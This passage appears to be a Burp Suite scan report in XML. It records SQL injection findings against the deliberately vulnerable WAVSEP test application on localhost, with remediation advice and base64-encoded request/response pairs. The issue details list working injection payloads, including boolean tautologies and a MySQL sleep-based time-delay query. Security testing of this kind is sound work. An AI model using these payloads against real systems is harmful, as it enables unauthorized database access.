W1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjIyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNiAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiB0cmFuc2FjdGlvbnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5637216890721105920</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case07-InjectionInSearch-Numeric-UnionExploit-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case07-InjectionInSearch-Numeric-UnionExploit-With200Errors.jsp [msgId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgId</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the msgId parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payloads <b>89483618 or 5372=05372</b> and <b>36545726 or 8268=8277</b> were each submitted in the msgId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgId parameter. The application took <b>20004</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTA3LUluamVjdGlvbkluU2VhcmNoLU51bWVyaWMtVW5pb25FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwP21zZ0lkPTEnIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTIzDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjAyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNyAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpFeGNlcHRpb24gZGV0YWlsczogamF2YS5zcWwuU1FMU3ludGF4RXJyb3JFeGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gdXNlIG5lYXIgJycnIGF0IGxpbmUgMQoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTA3LUluamVjdGlvbkluU2VhcmNoLU51bWVyaWMtVW5pb25FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwP21zZ0lkPTE4OTQ4MzYxOCUyMG9yJTIwNTM3MiUzZDA1MzcyIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU2OjIyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3MTUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNyAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEKPC9URD4KPFREPgpXZWxjb21lIHRvIHRoZSB3ZWIgc2l0ZQo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoyCjwvVEQ+CjxURD4KUmVtZW1iZXIgdG8gY2hhbmdlIHlvdXIgcGFzc3dvcmQKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMwo8L1REPgo8VEQ+CllvdXIgYWNjb3VudCBpcyBhYm91dCB0byBleHBpcmUKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTA3LUluamVjdGlvbkluU2VhcmNoLU51bWVyaWMtVW5pb25FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwP21zZ0lkPTEzNjU0NTcyNiUyMG9yJTIwODI2OCUzZDgyNzcgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU2OjIyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTINCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNyAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTA3LUluamVjdGlvbkluU2VhcmNoLU51bWVyaWMtVW5pb25FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwP21zZ0lkPShzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjIyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTINCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNyAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5136646345143805952</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case08-InjectionInCalc-Numeric-BooleanExploit-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case08-InjectionInCalc-Numeric-BooleanExploit-With200Errors.jsp [minBalanace parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>minBalanace</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the minBalanace parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payloads <b>15478201 or 9508=09508</b> and <b>59742713 or 9358=9361</b> were each submitted in the minBalanace parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the minBalanace parameter. The application took <b>20012</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTA4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljLUJvb2xlYW5FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwP21pbkJhbGFuYWNlPTEwMDAwJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTI3DQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjAyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOCAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGEgY2FsY3VsYXRpb24gcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3V